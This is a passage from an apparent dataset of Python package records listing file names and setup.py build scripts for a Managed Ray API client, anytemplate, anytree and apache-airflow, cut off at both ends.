decoratedapplicationtemplate_list_response.py decoratedapplicationtemplate_response.py decoratedbuild_list_response.py decoratedbuild_response.py decoratedcomputetemplate_list_response.py decoratedcomputetemplate_response.py decoratedcronjob_list_response.py decoratedcronjob_response.py decoratedinteractivesession_list_response.py decoratedinteractivesession_response.py decoratedjobsubmission_list_response.py decoratedjobsubmission_response.py decoratedjob_list_response.py decoratedjob_response.py decoratedproductionjobstatetransition_list_response.py decoratedproductionjob_list_response.py decoratedproductionjob_response.py decoratedruntimeenv_list_response.py decoratedruntimeenv_response.py decoratedservedeployment_list_response.py decoratedservedeployment_response.py decoratedsession_list_response.py decoratedsession_response.py decoratedsupportrequest_list_response.py decoratedsupportrequest_response.py decorated_actor.py decorated_application_template.py decorated_build.py decorated_compute_template.py decorated_compute_template_config.py decorated_cron_job.py decorated_interactive_session.py decorated_job.py decorated_job_submission.py decorated_production_job.py decorated_production_job_state_transition.py decorated_runtime_env.py decorated_serve_deployment.py decorated_session.py decorated_support_request.py deployment_status.py dismissal_type.py ebs_block_device.py error.py executecommandresponse_response.py execute_command_response.py execute_interactive_command_options.py execute_shell_command_options.py experimentalworkspace_list_response.py experimentalworkspace_response.py experimental_workspace.py externalservicestatusresponse_response.py external_service_status.py external_service_status_response.py external_terminal_command.py featureflagresponse_response.py feature_compatibility.py feature_flag_response.py gcp_node_disk.py gcp_node_options.py githubproject_response.py github_project.py ha_jobs_sort_field.py ha_job_goal_states.py ha_job_states.py ha_job_type.py headip_response.py head_ip.py historicalcosts_list_response.py historical_costs.py historical_cost_granularity.py http_validation_error.py iam_instance_profile_specification.py idle_termination_status.py instance.py instanceexternalip_response.py instanceid_response.py instanceinternalip_response.py instanceisrunning_response.py instanceisterminated_response.py instancepoolmember_response.py instance_external_ip.py instance_id.py instance_internal_ip.py instance_is_running.py instance_is_terminated.py instance_list_response.py instance_pool_member.py instance_response.py instance_status.py interactivesessionlogs_response.py interactive_session_logs.py internalproductionjob_response.py internal_production_job.py invoice.py invoices_query.py invoice_list_response.py invoice_status.py jobslogsqueryinfo_response.py jobslogs_response.py jobs_logs.py jobs_logs_query_info.py jobs_sort_field.py job_access.py job_run_type.py job_state_log_level_types.py job_status.py job_submissions_sort_field.py json_patch_operation.py list_response_metadata.py logdetails_response.py login_user_params.py logsoutput_response.py logs_output.py log_detail.py log_details.py log_download_config.py log_download_request.py log_filter.py log_level_types.py metric_period.py minibuild_list_response.py minicomputetemplate_list_response.py miniproject_list_response.py mini_build.py mini_cloud.py mini_cluster.py mini_compute_template.py mini_job_run.py mini_namespace.py mini_organization.py mini_production_job.py mini_project.py mini_runtime_environment.py mini_user.py network_interface.py nodes_options.py node_registration.py node_registration_aws.py node_registration_gcp.py node_type.py non_terminated_nodes_options.py onboarding_user_cards_query.py organization.py organizationavailability_response.py organizationcollaborator_list_response.py organizationinvitationbase_response.py organizationinvitation_list_response.py organizationinvitation_response.py organizationprojectcollaborator_list_response.py organization_availability.py organization_collaborator.py organization_invitation.py organization_invitation_base.py organization_permission_level.py organization_project_collaborator.py organization_project_collaborator_value.py organization_response.py page_query.py permission_level.py poolconfiginfo_response.py poolinstance_list_response.py pool_config_info.py pool_instance.py productionjob_response.py production_job.py production_job_config.py production_job_state_transition.py product_type.py project.py projectbase_response.py projectcollaborator_list_response.py projectdefaultsessionname_response.py projects_sort_field.py project_base.py project_collaborator.py project_collaborators_put_message.py project_collaborator_value.py project_create_message.py project_default_session_name.py project_delete_message.py project_list_response.py project_patch_message.py project_response.py providermetadata_response.py provider_metadata.py python_modules.py query_pool_size.py ray_runtime_env_config.py request_instance_pool_member.py request_organization_identifiers_params.py request_password_reset_params.py reset_password_params.py resources.py resource_historical_costs.py s3_download_location.py servedeploymentlogs_response.py servereplica_list_response.py serversessiontoken_response.py server_session_token.py serve_deployment_grafana_dashboard_status.py serve_deployment_logs.py serve_replica.py serve_replica_metric.py service_account.py service_usage.py session.py sessioncommandid_response.py sessioncommand_list_response.py sessiondescribe_response.py sessiondetails_response.py sessionevent_list_response.py sessionhistoryitem_list_response.py sessionid_response.py sessionsshkey_response.py sessions_sort_field.py session_access.py session_autosync_sessions_update_message.py session_command.py session_command_finish_options.py session_command_id.py session_command_types.py session_create_message.py session_delete_message.py session_describe.py session_details.py session_event.py session_event_cause.py session_event_types.py session_execute_message.py session_finish_command_message.py session_history_item.py session_id.py session_kill_command_message.py session_list_response.py session_patch_message.py session_response.py session_ssh_key.py session_starting_up_data.py session_state.py session_state_change_message.py session_state_data.py session_stopping_data.py session_up_options.py setup_initialize_session_options.py set_node_tags_options.py snapshot_create_message.py snapshot_delete_message.py snapshot_patch_message.py socketmessageschemas_response.py socketmessagetypes_response.py socket_message_schemas.py socket_message_types.py sort_order.py ssologininfo_response.py sso_login_info.py startemptysessionresponse_response.py start_empty_session_response.py start_session_options.py stop_session_options.py structuredoutput_response.py structured_output.py supportedbaseimagesenum.py support_requests_query.py text_query.py timestampedlogsoutput_response.py timestamped_logs_output.py update_compute_template.py update_organization_collaborator.py update_project_collaborator.py uploadsessioncommandlogslocations_response.py upload_session_command_logs_locations.py userinfo_response.py user_info.py user_resend_email_options.py user_service_access_types.py validation_error.py visibility.py wait_until_stopped_options.py wandburlresponse_response.py wand_burl_response.py wand_b_data.py webterminal_list_response.py webterminal_response.py web_terminal.py worker_node_type.py write_cloud.py write_cluster_config.py write_project.py write_session.py write_support_request.py __init__.py rest.py __init__.py README.md requirements.txt setup.cfg setup.py test-requirements.txt tox.ini cli_logger.py cloud.py cluster.py cluster_compute.py cluster_config.py cluster_env.py api_commands.py projects_commands.py sessions_commands.py session_commands_commands.py session_operations_commands.py __init__.py auth_commands.py cloud_commands.py cluster_commands.py cluster_compute_commands.py cluster_env_commands.py config_commands.py download_logs_commands.py exec_commands.py experimental_integrations_commands.py job_commands.py list_commands.py migrate_commands.py project_commands.py service_commands.py session_commands.py session_commands_hidden.py util.py workspace_commands.py __init__.py conf.py connect.py prepare_cluster.py project.py start_interactive_session.py __init__.py auth_controller.py base_controller.py cloud_controller.py cluster_compute_controller.py cluster_controller.py cluster_env_controller.py config_controller.py exec_controller.py experimental_integrations_controller.py jobs_bg_controller.py job_controller.py list_controller.py project_controller.py service_controller.py session_controller.py workspace_controller.py __init__.py experimental_integrations.py feature_flags.py fingerprint.py clouds_formatter.py common_formatter.py __init__.py job.py links.py project.py ProjectConfig.json scripts.py default_api.py __init__.py api_client.py configuration.py exceptions.py actor.py actorlogs_response.py actors_query.py actor_lifetime.py actor_list_response.py actor_logs.py actor_response.py actor_status.py appconfig_list_response.py appconfig_response.py app_config.py app_config_config_schema.py archive_status.py aws_node_options.py aws_tag.py aws_tag_specification.py baseimagesenum.py base_job_status.py block_device_mapping.py build.py buildlogresponse_response.py build_list_response.py build_log_response.py build_response.py build_status.py cloud.py clouds_query.py cloud_config.py cloud_list_response.py cloud_providers.py cloud_response.py cloud_status.py cloud_types.py cluster.py clustercompute_list_response.py clustercompute_response.py clusterenvironmentbuildlogresponse_response.py clusterenvironmentbuildoperation_response.py clusterenvironmentbuild_list_response.py clusterenvironmentbuild_response.py clusterenvironment_list_response.py clusterenvironment_response.py clusteroperation_response.py clusters_query.py cluster_compute.py cluster_computes_query.py cluster_compute_config.py cluster_environment.py cluster_environments_query.py cluster_environment_build.py cluster_environment_build_log_response.py cluster_environment_build_operation.py cluster_environment_build_status.py cluster_head_node_info.py cluster_list_response.py cluster_operation.py cluster_operation_type.py cluster_response.py cluster_services_urls.py cluster_state.py computetemplateconfig_response.py computetemplate_list_response.py computetemplate_response.py compute_node_type.py compute_template.py compute_template_config.py compute_template_query.py create_app_config.py create_app_config_configuration_schema.py create_build.py create_cloud.py create_cluster.py create_cluster_compute.py create_cluster_compute_config.py create_cluster_environment.py create_cluster_environment_build.py create_cluster_environment_configuration_schema.py create_compute_template.py create_production_job.py create_production_job_config.py create_production_service.py create_project.py create_response.py create_session.py create_session_command.py create_sso_config.py ebs_block_device.py gcp_node_disk.py gcp_node_options.py ha_job_goal_states.py ha_job_states.py http_validation_error.py iam_instance_profile_specification.py idle_termination_status.py job.py jobslogs_response.py jobs_logs.py jobs_query.py jobs_sort_field.py job_list_response.py job_response.py job_run_type.py job_status.py list_response_metadata.py log_level_types.py namespace.py namespace_response.py network_interface.py objectstorageconfig_response.py object_storage_config.py object_storage_config_s3.py operation_error.py operation_progress.py operation_result.py organization.py organization_response.py page_query.py productionjob_list_response.py productionjob_response.py productionservice_list_response.py productionservice_response.py production_job.py production_job_config.py production_job_state_transition.py production_service.py project.py projects_query.py project_list_response.py project_response.py python_modules.py python_version.py ray_runtime_env_config.py resources.py runtimeenvironment_response.py runtime_environment.py service_account.py session.py sessioncommand_list_response.py sessioncommand_response.py sessionevent_list_response.py sessionoperation_response.py sessions_query.py session_command.py session_command_types.py session_event.py session_event_cause.py session_event_types.py session_list_response.py session_operation.py session_operation_type.py session_response.py session_starting_up_data.py session_state.py session_state_data.py session_stopping_data.py sort_by_clause_jobs_sort_field.py sort_order.py ssoconfig_response.py sso_config.py sso_mode.py start_cluster_options.py start_session_options.py static_sso_config.py supportedbaseimagesenum.py terminate_cluster_options.py terminate_session_options.py text_query.py update_app_config.py update_cloud.py update_cluster.py update_compute_template.py update_organization.py update_project.py update_session.py user_service_access_types.py validation_error.py worker_node_type.py __init__.py rest.py sdk.py __init__.py conf.py default_anyscale_aws.yaml default_anyscale_gcp.yaml headers.py project.py util.py byod.py id_gen.py protected_string.py ray_semver.py __init__.py __init__.py snapshot.py snapshot_util.py util.py aws_credentials_util.py cloud_utils.py connect_helpers.py env_utils.py ray_conda.py ray_utils.py ray_version_checker.py runtime_env.py __init__.py version.py command_persister.py utils.py webterminal.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt BUILD.bazel PKG-INFO README.md requirements.in setup.cfg setup.py BUILD.bazel test_node_provider.py BUILD.bazel clientLibraryConfig-aws-pool.json conftest.py BUILD.bazel test_prepare_cluster.py test_project_block.py test_start_interactive_session.py BUILD.bazel test_auth_controller.py test_base_controller.py test_cloud_controller.py test_cluster_compute_controller.py test_cluster_controller.py test_cluster_env_controller.py test_config_controller.py test_exec_controller.py test_job_controller.py test_job_controller_working_dir.py test_list_controller.py test_project_controller.py test_service_controller.py test_session_controller.py __init__.py test_authenticate.py test_auth_proxy.py test_cli_logger.py test_cli_utils.py test_cloud.py test_cluster.py test_cluster_compute.py test_cluster_config.py test_cluster_env.py test_connect.py test_init.py test_job_output.py test_project.py test_ray_version_checker.py test_runtime_env.py test_util.py __init__.py,"# coding: utf-8

""""""
    Managed Ray API

    No description provided (generated by Openapi Generator https://github.com/openapitools/openapi-generator)  # noqa: E501

    The version of the OpenAPI document: 0.1.0
    Generated by: https://openapi-generator.tech
""""""


from setuptools import setup, find_packages  # noqa: H301

NAME = ""openapi-client""
VERSION = ""1.0.0""
# To install the library, run the following
#
# python setup.py install
#
# prerequisite: setuptools
# http://pypi.python.org/pypi/setuptools

REQUIRES = [""urllib3 >= 1.15"", ""six >= 1.10"", ""certifi"", ""python-dateutil""]

setup(
    name=NAME,
    version=VERSION,
    description=""Managed Ray API"",
    author=""OpenAPI Generator community"",
    author_email=""team@openapitools.org"",
    url="""",
    keywords=[""OpenAPI"", ""OpenAPI-Generator"", ""Managed Ray API""],
    install_requires=REQUIRES,
    packages=find_packages(exclude=[""test"", ""tests""]),
    include_package_data=True,
    long_description=""""""\
    No description provided (generated by Openapi Generator https://github.com/openapitools/openapi-generator)  # noqa: E501
    """"""
)
",1
anytemplate-0.1.6,0,1,1,1,1,0,0,0,.gitignore .travis.yml ChangeLog ctx.yml jinja2-incl.j2 jinja2.j2 LICENSE.MIT MANIFEST.in copr-build.sh nose.cfg package.spec.in PKG-INFO README.rst requirements.txt setup.cfg setup.py api.py cli.py compat.py engine.py base.py cheetah.py jinja2.py mako.py pystache.py strtemplate.py tenjin.py __init__.py globals.py utils.py __init__.py dependency_links.txt entry_points.txt PKG-INFO requires.txt SOURCES.txt top_level.txt api.py cli.py common.py compat.py engine.py base.py cheetah.py jinja2.py mako.py pystache.py strtemplate.py tenjin.py __init__.py globals.py import_errors.py releng.bats requirements.txt utils.py __init__.py tox.ini,"""""""setup.py to build package.
""""""
from __future__ import absolute_import

import glob
import os.path
import os
import re
import setuptools
import setuptools.command.bdist_rpm


# It might throw IndexError and so on.
VERSION = [re.search(r'^VERSION = ""([^""]+)""', l).groups()[0] for l
           in open(glob.glob(""src/*/globals.py"")[0])
           if ""VERSION"" in l][0]

# For daily snapshot versioning mode:
RELEASE = ""1%{?dist}""
if os.environ.get(""_SNAPSHOT_BUILD"", None) is not None:
    import datetime
    RELEASE = datetime.datetime.now().strftime("".%Y%m%d%H%M%S"")


def _replace(line):
    """"""Replace some strings in the RPM SPEC template""""""
    if ""@VERSION@"" in line:
        return line.replace(""@VERSION@"", VERSION)

    if ""@RELEASE@"" in line:
        return line.replace(""@RELEASE@"", RELEASE)

    if ""Source0:"" in line:  # Dirty hack
        return ""Source0: %{pkgname}-%{version}.tar.gz""

    return line


class bdist_rpm(setuptools.command.bdist_rpm.bdist_rpm):
    """"""Override the default content of the RPM SPEC.
    """"""
    spec_tmpl = os.path.join(os.path.abspath(os.curdir),
                             ""pkg/package.spec.in"")

    def _make_spec_file(self):
        return [_replace(l.rstrip()) for l in open(self.spec_tmpl)]


setuptools.setup(name=""anytemplate"",   # Avoid 'Unknown' package in older ones.
                 version=VERSION,
                 cmdclass=dict(bdist_rpm=bdist_rpm),
                 package_dir={'': 'src'})

# vim:sw=4:ts=4:et:
",1
anytree-2.8.0,0,1,1,1,1,0,0,0,cachedsearch.py dotexport.py dictexporter.py dotexporter.py jsonexporter.py __init__.py dictimporter.py jsonimporter.py __init__.py abstractiter.py levelordergroupiter.py levelorderiter.py postorderiter.py preorderiter.py zigzaggroupiter.py __init__.py anynode.py exceptions.py node.py nodemixin.py symlinknode.py symlinknodemixin.py util.py __init__.py render.py resolver.py search.py __init__.py walker.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt anytree.cachedsearch.rst anytree.iterators.rst anytree.node.rst anytree.render.rst anytree.resolver.rst anytree.search.rst anytree.util.rst anytree.walker.rst api.rst conf.py dotexport.rst dictexporter.rst dotexporter.rst jsonexporter.rst exporter.rst dictimporter.rst jsonimporter.rst importer.rst index.rst installation.rst intro.rst Makefile buymeacoffee.png dan.png dotexporter0.png dotexporter1.png tree.png udo.png uniquedotexporter2.png weight.png multidim.rst readonly.rst weightededges.rst yaml.rst tricks.rst LICENSE MANIFEST.in PKG-INFO README.rst setup.cfg setup.py helper.py tree1.dot tree2.dot tree3.dot tree4.dot test_cachedsearch.py test_dictexporter.py test_dictimporter.py test_dotexport.py test_dotexporter.py test_examples.py test_iterators.py test_jsonexporter.py test_jsonimporter.py test_node.py test_node_integrity.py test_node_sep.py test_node_symlink.py test_render.py test_resolver.py test_search.py test_special_methods_access.py test_uniquedotexporter.py test_util.py test_walker.py tox.ini,"""""""Powerful and Lightweight Python Tree Data Structure with various plugins.""""""

# To use a consistent encoding
from codecs import open
from os import path

# Always prefer setuptools over distutils
from setuptools import setup


def _read_metainfo(filepath):
    import re
    pat = re.compile(r""__(?P<name>[a-z_]+)__ = (?P<expr>.*)"")
    metainfo = {}
    with open(filepath) as fh:
        for line in fh:
            if isinstance(line, bytes):
                line = line.decode(""utf-8"")
            match = pat.match(line)
            if match:
                metainfo[match.group(""name"")] = eval(match.group(""expr""))
    return metainfo


config = _read_metainfo(""anytree/__init__.py"")
config['name'] = 'anytree'
config['license'] = 'Apache 2.0'
config['classifiers'] = [
    'Development Status :: 5 - Production/Stable',
    'Programming Language :: Python :: 2',
    'Programming Language :: Python :: 2.7',
    'Programming Language :: Python :: 3',
    'Programming Language :: Python :: 3.4',
    'Programming Language :: Python :: 3.5',
    'Programming Language :: Python :: 3.6',
    'Programming Language :: Python :: 3.7',
    'Programming Language :: Python :: 3.8',
]
config['keywords'] = 'tree, tree data, treelib, tree walk, tree structure'
config['packages'] = ['anytree', 'anytree.node', 'anytree.iterators',
                      'anytree.importer', 'anytree.exporter', 'anytree.util']
config['install_requires'] = ['six>=1.9.0']
config['extras_require'] = {
    'fastcache':  ['fastcache'],
}
config['extras_require'] = {
    'dev': ['check-manifest'],
    'test': ['coverage'],
}
config['tests_require'] = ['nose']
config['test_suite'] = 'nose.collector'
config['data_files'] = [('', ['LICENSE'])]

# Get the long description from the README file
here = path.abspath(path.dirname(__file__))
with open(path.join(here, 'README.rst'), encoding='utf-8') as f:
    config['long_description'] = f.read()

# python 2.6 does not implement OrderedDict, so we have to install it
try:
    from collections import OrderedDict  # noqa
except ImportError:
    config['install_requires'].append(""ordereddict"")

setup(**config)
",1
apache-airflow-2.3.3,0,1,1,1,1,0,0,0,alembic.ini basic_auth.py default.py deny_all.py kerberos_auth.py session.py __init__.py __init__.py api_client.py json_client.py local_client.py __init__.py delete_dag.py delete_dag.py get_code.py get_dag_runs.py get_dag_run_state.py get_lineage.py get_task.py get_task_instance.py mark_tasks.py pool.py trigger_dag.py __init__.py mark_tasks.py trigger_dag.py __init__.py __init__.py config_endpoint.py connection_endpoint.py dag_endpoint.py dag_run_endpoint.py dag_source_endpoint.py event_log_endpoint.py extra_link_endpoint.py health_endpoint.py import_error_endpoint.py log_endpoint.py plugin_endpoint.py pool_endpoint.py provider_endpoint.py request_dict.py role_and_permission_endpoint.py task_endpoint.py task_instance_endpoint.py user_endpoint.py variable_endpoint.py version_endpoint.py xcom_endpoint.py __init__.py exceptions.py v1.yaml parameters.py common_schema.py config_schema.py connection_schema.py dag_run_schema.py dag_schema.py dag_source_schema.py enum_schemas.py error_schema.py event_log_schema.py health_schema.py log_schema.py plugin_schema.py pool_schema.py provider_schema.py role_and_permission_schema.py sla_miss_schema.py task_instance_schema.py task_schema.py user_schema.py variable_schema.py version_schema.py xcom_schema.py __init__.py security.py types.py __init__.py base_callback_sink.py callback_requests.py database_callback_sink.py pipe_callback_sink.py __init__.py cli_parser.py celery_command.py cheat_sheet_command.py config_command.py connection_command.py dag_command.py dag_processor_command.py db_command.py info_command.py jobs_command.py kerberos_command.py kubernetes_command.py legacy_commands.py plugins_command.py pool_command.py provider_command.py role_command.py rotate_fernet_key_command.py scheduler_command.py standalone_command.py sync_perm_command.py task_command.py triggerer_command.py user_command.py variable_command.py version_command.py webserver_command.py __init__.py simple_table.py __init__.py functools.py sqlalchemy.py __init__.py configuration.py airflow_local_settings.py config.yml config.yml.schema.json default_airflow.cfg default_celery.py default_test.cfg default_webserver_config.py __init__.py aws_athena_hook.py aws_datasync_hook.py aws_dynamodb_hook.py aws_firehose_hook.py aws_glue_catalog_hook.py aws_hook.py aws_lambda_hook.py aws_logs_hook.py aws_sns_hook.py aws_sqs_hook.py azure_container_instance_hook.py azure_container_registry_hook.py azure_container_volume_hook.py azure_cosmos_hook.py azure_data_lake_hook.py azure_fileshare_hook.py bigquery_hook.py cassandra_hook.py cloudant_hook.py databricks_hook.py datadog_hook.py datastore_hook.py dingding_hook.py discord_webhook_hook.py emr_hook.py fs_hook.py ftp_hook.py gcp_api_base_hook.py gcp_bigtable_hook.py gcp_cloud_build_hook.py gcp_compute_hook.py gcp_container_hook.py gcp_dataflow_hook.py gcp_dataproc_hook.py gcp_dlp_hook.py gcp_function_hook.py gcp_kms_hook.py gcp_mlengine_hook.py gcp_natural_language_hook.py gcp_pubsub_hook.py gcp_spanner_hook.py gcp_speech_to_text_hook.py gcp_sql_hook.py gcp_tasks_hook.py gcp_text_to_speech_hook.py gcp_transfer_hook.py gcp_translate_hook.py gcp_video_intelligence_hook.py gcp_vision_hook.py gcs_hook.py gdrive_hook.py grpc_hook.py imap_hook.py jenkins_hook.py jira_hook.py mongo_hook.py openfaas_hook.py opsgenie_alert_hook.py pagerduty_hook.py pinot_hook.py qubole_check_hook.py qubole_hook.py redis_hook.py redshift_hook.py sagemaker_hook.py salesforce_hook.py segment_hook.py sftp_hook.py slack_webhook_hook.py snowflake_hook.py spark_jdbc_hook.py spark_sql_hook.py spark_submit_hook.py sqoop_hook.py ssh_hook.py vertica_hook.py wasb_hook.py winrm_hook.py __init__.py adls_list_operator.py adls_to_gcs.py awsbatch_operator.py aws_athena_operator.py aws_sqs_publish_operator.py azure_container_instances_operator.py azure_cosmos_operator.py bigquery_check_operator.py bigquery_get_data.py bigquery_operator.py bigquery_table_delete_operator.py bigquery_to_bigquery.py bigquery_to_gcs.py bigquery_to_mysql_operator.py cassandra_to_gcs.py databricks_operator.py dataflow_operator.py dataproc_operator.py datastore_export_operator.py datastore_import_operator.py dingding_operator.py discord_webhook_operator.py docker_swarm_operator.py druid_operator.py dynamodb_to_s3.py ecs_operator.py emr_add_steps_operator.py emr_create_job_flow_operator.py emr_terminate_job_flow_operator.py file_to_gcs.py file_to_wasb.py gcp_bigtable_operator.py gcp_cloud_build_operator.py gcp_compute_operator.py gcp_container_operator.py gcp_dlp_operator.py gcp_function_operator.py gcp_natural_language_operator.py gcp_spanner_operator.py gcp_speech_to_text_operator.py gcp_sql_operator.py gcp_tasks_operator.py gcp_text_to_speech_operator.py gcp_transfer_operator.py gcp_translate_operator.py gcp_translate_speech_operator.py gcp_video_intelligence_operator.py gcp_vision_operator.py gcs_acl_operator.py gcs_delete_operator.py gcs_download_operator.py gcs_list_operator.py gcs_operator.py gcs_to_bq.py gcs_to_gcs.py gcs_to_gcs_transfer_operator.py gcs_to_gdrive_operator.py gcs_to_s3.py grpc_operator.py hive_to_dynamodb.py imap_attachment_to_s3_operator.py jenkins_job_trigger_operator.py jira_operator.py kubernetes_pod_operator.py mlengine_operator.py mongo_to_s3.py mssql_to_gcs.py mysql_to_gcs.py opsgenie_alert_operator.py oracle_to_azure_data_lake_transfer.py oracle_to_oracle_transfer.py postgres_to_gcs_operator.py pubsub_operator.py qubole_check_operator.py qubole_operator.py redis_publish_operator.py s3_copy_object_operator.py s3_delete_objects_operator.py s3_list_operator.py s3_to_gcs_operator.py s3_to_gcs_transfer_operator.py s3_to_sftp_operator.py sagemaker_base_operator.py sagemaker_endpoint_config_operator.py sagemaker_endpoint_operator.py sagemaker_model_operator.py sagemaker_training_operator.py sagemaker_transform_operator.py sagemaker_tuning_operator.py segment_track_event_operator.py sftp_operator.py sftp_to_s3_operator.py slack_webhook_operator.py snowflake_operator.py sns_publish_operator.py spark_jdbc_operator.py spark_sql_operator.py spark_submit_operator.py sql_to_gcs.py sqoop_operator.py ssh_operator.py vertica_operator.py vertica_to_hive.py vertica_to_mysql.py wasb_delete_blob_operator.py winrm_operator.py __init__.py aws_secrets_manager.py aws_systems_manager.py azure_key_vault.py gcp_secrets_manager.py hashicorp_vault.py __init__.py aws_athena_sensor.py aws_glue_catalog_partition_sensor.py aws_redshift_cluster_sensor.py aws_sqs_sensor.py azure_cosmos_sensor.py bash_sensor.py bigquery_sensor.py cassandra_record_sensor.py cassandra_table_sensor.py celery_queue_sensor.py datadog_sensor.py emr_base_sensor.py emr_job_flow_sensor.py emr_step_sensor.py file_sensor.py ftp_sensor.py gcp_transfer_sensor.py gcs_sensor.py hdfs_sensor.py imap_attachment_sensor.py jira_sensor.py mongo_sensor.py pubsub_sensor.py python_sensor.py qubole_sensor.py redis_key_sensor.py redis_pub_sub_sensor.py sagemaker_base_sensor.py sagemaker_endpoint_sensor.py sagemaker_training_sensor.py sagemaker_transform_sensor.py sagemaker_tuning_sensor.py sftp_sensor.py wasb_sensor.py weekday_sensor.py __init__.py cgroup_task_runner.py __init__.py gcp_field_sanitizer.py gcp_field_validator.py task_handler_with_custom_formatter.py __init__.py mlengine_operator_utils.py mlengine_prediction_summary.py sendgrid.py weekday.py __init__.py __init__.py customized_form_field_behaviours.schema.json manager.py processor.py __init__.py base.py branch_python.py python.py python_virtualenv.py task_group.py __init__.py example_bash_operator.py example_branch_datetime_operator.py example_branch_day_of_week_operator.py example_branch_labels.py example_branch_operator.py example_branch_operator_decorator.py example_branch_python_dop_operator_3.py example_complex.py example_dag_decorator.py example_external_task_marker_dag.py example_kubernetes_executor.py example_latest_only.py example_latest_only_with_trigger.py example_local_kubernetes_executor.py example_nested_branch_dag.py example_passing_params_via_test_command.py example_python_operator.py example_short_circuit_operator.py example_skip_dag.py example_sla_dag.py example_subdag_operator.py example_task_group.py example_task_group_decorator.py example_time_delta_sensor_async.py example_trigger_controller_dag.py example_trigger_target_dag.py example_xcom.py example_xcomargs.py helper.py __init__.py workday.py __init__.py subdag.py __init__.py tutorial.py tutorial_etl_dag.py tutorial_taskflow_api_etl.py tutorial_taskflow_api_etl_virtualenv.py __init__.py exceptions.py base_executor.py celery_executor.py celery_kubernetes_executor.py dask_executor.py debug_executor.py executor_constants.py executor_loader.py kubernetes_executor.py local_executor.py local_kubernetes_executor.py sequential_executor.py __init__.py git_version base.py base_hook.py dbapi.py dbapi_hook.py docker_hook.py druid_hook.py filesystem.py hdfs_hook.py hive_hooks.py http_hook.py jdbc_hook.py mssql_hook.py mysql_hook.py oracle_hook.py pig_hook.py postgres_hook.py presto_hook.py S3_hook.py samba_hook.py slack_hook.py sqlite_hook.py subprocess.py webhdfs_hook.py zendesk_hook.py __init__.py backfill_job.py base_job.py local_task_job.py scheduler_job.py triggerer_job.py __init__.py k8s_model.py kubernetes_helper_functions.py kube_client.py kube_config.py pod.py pod_generator.py pod_generator_deprecated.py pod_launcher.py pod_launcher_deprecated.py pod_runtime_info_env.py secret.py volume.py volume_mount.py __init__.py backend.py entities.py __init__.py events.py listener.py spec.py __init__.py logging_config.py hive.py __init__.py db_types.py env.py utils.py 0001_1_5_0_current_schema.py 0002_1_5_0_create_is_encrypted.py 0003_1_5_0_for_compatibility.py 0004_1_5_0_more_logging_into_task_isntance.py 0005_1_5_2_job_id_indices.py 0006_1_6_0_adding_extra_to_log.py 0007_1_6_0_add_dagrun.py 0008_1_6_0_task_duration.py 0009_1_6_0_dagrun_config.py 0010_1_6_2_add_password_column_to_user.py 0011_1_6_2_dagrun_start_end.py 0012_1_7_0_add_notification_sent_column_to_sla_miss.py 0013_1_7_0_add_a_column_to_track_the_encryption_.py 0014_1_7_0_add_is_encrypted_column_to_variable_.py 0015_1_7_1_rename_user_table.py 0016_1_7_1_add_ti_state_index.py 0017_1_7_1_add_task_fails_journal_table.py 0018_1_7_1_add_dag_stats_table.py 0019_1_7_1_add_fractional_seconds_to_mysql_tables.py 0020_1_7_1_xcom_dag_task_indices.py 0021_1_7_1_add_pid_field_to_taskinstance.py 0022_1_7_1_add_dag_id_state_index_on_dag_run_table.py 0023_1_8_2_add_max_tries_column_to_task_instance.py 0024_1_8_2_make_xcom_value_column_a_large_binary.py 0025_1_8_2_add_ti_job_id_index.py 0026_1_8_2_increase_text_size_for_mysql.py 0027_1_10_0_add_time_zone_awareness.py 0028_1_10_0_add_kubernetes_resource_checkpointing.py 0029_1_10_0_add_executor_config_to_task_instance.py 0030_1_10_0_add_kubernetes_scheduler_uniqueness.py 0031_1_10_0_merge_heads.py 0032_1_10_0_fix_mysql_not_null_constraint.py 0033_1_10_0_fix_sqlite_foreign_key.py 0034_1_10_0_index_taskfail.py 0035_1_10_2_add_idx_log_dag.py 0036_1_10_2_add_index_to_taskinstance.py 0037_1_10_2_add_task_reschedule_table.py 0038_1_10_2_add_sm_dag_index.py 0039_1_10_2_add_superuser_field.py 0040_1_10_3_add_fields_to_dag.py 0041_1_10_3_add_schedule_interval_to_dag.py 0042_1_10_3_task_reschedule_fk_on_cascade_delete.py 0043_1_10_4_make_taskinstance_pool_not_nullable.py 0044_1_10_7_add_serialized_dag_table.py 0045_1_10_7_add_root_dag_id_to_dag.py 0046_1_10_5_change_datetime_to_datetime2_6_on_mssql_.py 0047_1_10_4_increase_queue_name_size_limit.py 0048_1_10_3_remove_dag_stat_table.py 0049_1_10_7_merge_heads.py 0050_1_10_7_increase_length_for_connection_password.py 0051_1_10_8_add_dagtags_table.py 0052_1_10_10_add_pool_slots_field_to_task_instance.py 0053_1_10_10_add_rendered_task_instance_fields_table.py 0054_1_10_10_add_dag_code_table.py 0055_1_10_11_add_precision_to_execution_date_in_mysql.py 0056_1_10_12_add_dag_hash_column_to_serialized_dag_.py 0057_1_10_13_add_fab_tables.py 0058_1_10_13_increase_length_of_fab_ab_view_menu_.py 0059_2_0_0_drop_user_and_chart.py 0060_2_0_0_remove_id_column_from_xcom.py 0061_2_0_0_increase_length_of_pool_name.py 0062_2_0_0_add_dagrun_run_type.py 0063_2_0_0_set_conn_type_as_non_nullable.py 0064_2_0_0_add_unique_constraint_to_conn_id.py 0065_2_0_0_update_schema_for_smart_sensor.py 0066_2_0_0_add_queued_by_job_id_to_ti.py 0067_2_0_0_add_external_executor_id_to_ti.py 0068_2_0_0_drop_kuberesourceversion_and_.py 0069_2_0_0_add_scheduling_decision_to_dagrun_and_.py 0070_2_0_0_fix_mssql_exec_date_rendered_task_instance.py 0071_2_0_0_add_job_id_to_dagrun_table.py 0072_2_0_0_add_k8s_yaml_to_rendered_templates.py 0073_2_0_0_prefix_dag_permissions.py 0074_2_0_0_resource_based_permissions.py 0075_2_0_0_add_description_field_to_connection.py 0076_2_0_0_fix_description_field_in_connection_to_.py 0077_2_0_0_change_field_in_dagcode_to_mediumtext_.py 0078_2_0_1_remove_can_read_permission_on_config_.py 0079_2_0_2_increase_size_of_connection_extra_field_.py 0080_2_0_2_change_default_pool_slots_to_1.py 0081_2_0_2_rename_last_scheduler_run_column.py 0082_2_1_0_increase_pool_name_size_in_taskinstance.py 0083_2_1_0_add_description_field_to_variable.py 0084_2_1_0_resource_based_permissions_for_default_.py 0085_2_1_3_add_queued_at_column_to_dagrun_table.py 